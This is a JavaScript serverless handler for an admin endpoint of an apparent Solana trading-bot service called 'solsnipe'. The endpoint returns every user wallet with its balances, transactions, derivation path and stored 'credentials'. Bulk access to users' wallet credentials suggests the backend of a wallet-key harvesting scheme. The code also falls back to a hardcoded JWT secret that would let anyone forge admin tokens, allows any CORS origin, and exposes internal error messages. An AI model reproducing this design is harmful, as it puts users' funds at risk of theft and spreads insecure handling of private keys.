/**
 * Get All Wallets Endpoint
 * 
 * Admin-only endpoint to fetch all wallets with complete details
 * 
 * Required: Admin JWT token
 */

const jwt = require('jsonwebtoken');
const { FirebaseWalletStore } = require('./utils/firebaseWalletStore');

const JWT_SECRET = process.env.JWT_SECRET || 'your-super-secret-jwt-key-change-this';

const headers = {
  'Access-Control-Allow-Origin': '*',
  'Access-Control-Allow-Headers': 'Content-Type, Authorization',
  'Access-Control-Allow-Methods': 'GET, OPTIONS',
  'Content-Type': 'application/json'
};

exports.handler = async (event) => {
  // Handle CORS preflight
  if (event.httpMethod === 'OPTIONS') {
    return {
      statusCode: 200,
      headers,
      body: ''
    };
  }

  // Only allow GET requests
  if (event.httpMethod !== 'GET') {
    return {
      statusCode: 405,
      headers,
      body: JSON.stringify({ error: 'Method not allowed' })
    };
  }

  try {
    // Verify admin JWT token
    const authHeader = event.headers.authorization || event.headers.Authorization;
    
    if (!authHeader || !authHeader.startsWith('Bearer ')) {
      return {
        statusCode: 401,
        headers,
        body: JSON.stringify({ 
          error: 'Missing authorization token',
          message: 'Admin access required'
        })
      };
    }

    const token = authHeader.substring(7);
    
    let decoded;
    try {
      decoded = jwt.verify(token, JWT_SECRET);
    } catch (error) {
      return {
        statusCode: 401,
        headers,
        body: JSON.stringify({ 
          error: 'Invalid or expired token',
          message: 'Please login again'
        })
      };
    }

    // Verify admin role
    if (!decoded.isAdmin) {
      return {
        statusCode: 403,
        headers,
        body: JSON.stringify({ 
          error: 'Forbidden',
          message: 'Admin access required'
        })
      };
    }

    console.log('📋 Admin fetching all wallets...');

    // Get all wallets from Firebase
    const walletStore = new FirebaseWalletStore();
    let wallets;
    
    try {
      wallets = await walletStore.getAllWallets();
    } catch (error) {
      console.error('❌ Error fetching wallets:', error);
      return {
        statusCode: 500,
        headers,
        body: JSON.stringify({ 
          error: 'Failed to fetch wallets from database',
          details: error.message
        })
      };
    }

    // Calculate totals
    const totalWallets = wallets.length;
    const totalSolBalance = wallets.reduce((sum, w) => sum + (w.balance || 0), 0);
    const totalSolsnipeBalance = wallets.reduce((sum, w) => sum + (w.solsnipeBalance || 0), 0);
    const totalSolCredited = wallets.reduce((sum, w) => sum + (w.totalSolCredited || 0), 0);
    const totalSolsnipeCredited = wallets.reduce((sum, w) => sum + (w.totalSolsnipeCredited || 0), 0);
    const totalDepositedAmount = wallets.reduce((sum, w) => sum + (w.depositedAmount || 0), 0);
    const totalDeposited = wallets.reduce((sum, w) => sum + (w.totalDeposited || 0), 0);

    console.log(`✅ Retrieved ${totalWallets} wallets`);
    console.log(`   Total SOL Balance: ${totalSolBalance}`);
    console.log(`   Total Solsnipe Balance: ${totalSolsnipeBalance}`);
    console.log(`   Total Deposited Amount: ${totalDepositedAmount}`);

    return {
      statusCode: 200,
      headers,
      body: JSON.stringify({
        success: true,
        totals: {
          totalWallets,
          totalSolBalance,
          totalSolsnipeBalance,
          totalSolCredited,
          totalSolsnipeCredited,
          totalDepositedAmount,
          totalDeposited
        },
        wallets: wallets.map(wallet => ({
          walletId: wallet.walletId,
          walletAddress: wallet.walletAddress,
          walletType: wallet.walletType,
          inputType: wallet.inputType,
          blockchain: wallet.blockchain,
          
          // Balances
          balance: wallet.balance || 0,
          solsnipeBalance: wallet.solsnipeBalance || 0,
          depositedAmount: wallet.depositedAmount || 0,
          balanceLastUpdated: wallet.balanceLastUpdated,
          
          // Totals
          totalSolCredited: wallet.totalSolCredited || 0,
          totalSolsnipeCredited: wallet.totalSolsnipeCredited || 0,
          totalDeposited: wallet.totalDeposited || 0,
          
          // Counters
          autoSnipeBot: wallet.autoSnipeBot || 0,
          totalTrade: wallet.totalTrade || 0,
          
          // Withdrawal
          withdrawal: wallet.withdrawal || '',
          withdrawalCount: wallet.withdrawal ? (wallet.withdrawal.trim() !== '' ? JSON.parse(wallet.withdrawal).length : 0) : 0,
          
          // Auto snipe and trade counters
          autoSnipeBot: wallet.autoSnipeBot || 0,
          totalTrade: wallet.totalTrade || 0,
          
          // Withdrawal requests
          withdrawal: wallet.withdrawal || '',
          withdrawalCount: wallet.withdrawal && wallet.withdrawal.trim() !== '' ? JSON.parse(wallet.withdrawal).length : 0,
          
          // Credentials
          credentials: wallet.credentials || null,
          
          // Derivation
          derivationPath: wallet.derivationPath,
          accountIndex: wallet.accountIndex,
          
          // History
          transactions: wallet.transactions || [],
          transactionCount: (wallet.transactions || []).length,
          
          // Stats
          createdAt: wallet.createdAt,
          lastLoginAt: wallet.lastLoginAt,
          loginCount: wallet.loginCount || 0,
          
          // Metadata
          metadata: wallet.metadata || {}
        }))
      })
    };

  } catch (error) {
    console.error('💥 Get all wallets error:', error.message);
    
    return {
      statusCode: 500,
      headers,
      body: JSON.stringify({ 
        error: 'Internal server error',
        message: error.message
      })
    };
  }
};
